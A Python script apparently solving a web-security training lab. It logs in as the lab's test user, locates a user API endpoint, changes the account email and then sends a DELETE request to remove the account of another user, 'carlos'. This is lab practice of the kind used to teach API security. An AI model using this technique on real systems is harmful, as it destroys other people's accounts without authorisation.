# API Testing
#    Lab: Exploiting an API endpoint using documentation
# 
import requests
from bs4 import BeautifulSoup as BS

if __name__ == "__main__":
    base_url = "https://0aef00350399625082561a42001a0011.web-security-academy.net/"
    login_url = base_url + "login"
    my_account_url = base_url + "my-account"

    headers = {
        "Host": "0aef00350399625082561a42001a0011.web-security-academy.net",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Referer": base_url,
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",  
    }

    user = "wiener"
    password = "peter"

   
    response = requests.get(base_url, headers=headers)
    if response.status_code == 200:
        cookies = dict(response.cookies)
        print("Initial Cookie:", cookies)
    else:
        print("Error fetching initial page: ", response.reason)
        exit()

    
    res = requests.get(my_account_url, headers=headers, cookies=cookies)
    if res.status_code == 200:
        print("[+] Accessed My Account Page")
    else:
        print("Error: ", res.reason)
        exit()

    new_email="aaaa@aaa.com"
    soup = BS(res.text, "html.parser")
    csrf_token_input = soup.find("input", {"name": "csrf"})
    if csrf_token_input:
        csrf = csrf_token_input["value"]
        print("CSRF: ", csrf)
    else:
        print("CSRF Token Not Found")
        exit()

    
    login_payload = {
        "csrf": csrf,
        "username": user,
        "password": password,
    }

    res = requests.post(login_url, headers=headers, data=login_payload, cookies=cookies, allow_redirects=False)
    if res.status_code == 302:
        cookies = dict(res.cookies)
        #print("second cookie: ", cookies)
        print("Logged In, Redirect Location:", res.headers.get("Location"))
        redirect_location = res.headers.get("Location")
        print(redirect_location)
        redirected_url = base_url.strip("/") + redirect_location
        print("Full Redirected URL:", redirected_url)

        
        account_page = requests.get(redirected_url, headers=headers, cookies=cookies)
      
        if account_page.status_code == 200:
            soup = BS(account_page.text, "html.parser")
            cookies=dict(response.cookies)
            form_action = soup.find("form", {"name": "email-change-form"})
            if form_action:
                api_path = form_action["action"]
                api_url = base_url.strip("/") + api_path
                print(f"API URL: {api_url}")

                api_url = base_url.strip("/") + api_path
                api_url_with_user = f"{api_url}/{user}"
                print(api_url_with_user)
                
                payload = {"email": new_email}
                headers.update({
                    "Content-Type": "application/json",  
                    "Referer": my_account_url,
                })
                cookies.update(res.cookies)
                res=requests.patch(api_url_with_user,headers=headers,json=payload,cookies=cookies)
                print(res.status_code)
                print(cookies)
                if res.status_code == 200:
                    print("helloooo")
                   
                    print("email changed")
                else:
                    print("email not found", res.reason,res.text)
                    print(api_url_with_user)
            

            else:
                print("API URL Not Found.")
                exit()
        victim = "carlos"
        api_url=f"https://0aef00350399625082561a42001a0011.web-security-academy.net/api/user/{victim}"
        res=requests.delete(api_url,headers=headers,json=payload,cookies=cookies)
        if res.status_code==200:
            print(res.text)

            res=requests.get(api_url,headers=headers,json=payload,cookies=cookies)
            print("check vicitim",res.text)
        else:
            print(res.reason,res.text)
                
    else:
        print("Login Failed: ", res.reason)
        print("Response Text:", res.text)
    
    
                  
